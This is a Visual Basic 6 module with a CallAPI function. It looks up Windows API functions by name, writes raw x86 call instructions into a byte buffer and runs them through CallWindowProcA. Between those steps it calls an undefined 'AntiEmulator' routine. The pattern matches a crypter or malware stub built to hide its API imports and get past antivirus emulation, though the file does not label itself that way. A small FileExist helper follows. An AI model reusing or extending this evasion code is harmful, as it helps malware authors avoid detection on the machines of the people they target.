Attribute VB_Name = "C"
Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long



Function CallAPI(ByVal sLib As String, ByVal sMod As String, ParamArray Params()) As Long
    Dim lPtr                As Long
    Dim bvASM(&HEC00& - 1)  As Byte
    Dim i                   As Long
    Dim lMod                As Long
    
    lMod = GetProcAddress(LoadLibraryA(sLib), sMod)
    If lMod = 0 Then Exit Function
    
    Call AntiEmulator
    
    
    lPtr = VarPtr(bvASM(0))
    CopyBytes ByVal lPtr, &H59595958, &H4:              lPtr = lPtr + 4
    CopyBytes ByVal lPtr, &H5059, &H2:                  lPtr = lPtr + 2
    
    Call AntiEmulator
    
    For i = UBound(Params) To 0 Step -1
        CopyBytes ByVal lPtr, &H68, &H1:                lPtr = lPtr + 1
        CopyBytes ByVal lPtr, CLng(Params(i)), &H4:     lPtr = lPtr + 4
    
    Call AntiEmulator
    
    Next
    CopyBytes ByVal lPtr, &HE8, &H1:                    lPtr = lPtr + 1
    CopyBytes ByVal lPtr, lMod - lPtr - 4, &H4:         lPtr = lPtr + 4
    CopyBytes ByVal lPtr, &HC3, &H1:                    lPtr = lPtr + 1
    CallAPI = CallWindowProcA(VarPtr(bvASM(0)), 0, 0, 0, 0)
End Function
Public Function FileExist(Filename As String) As Boolean

  On Error GoTo NotExist
  
  Call FileLen(Filename)
  FileExist = True
  Exit Function
  
NotExist:
  
End Function
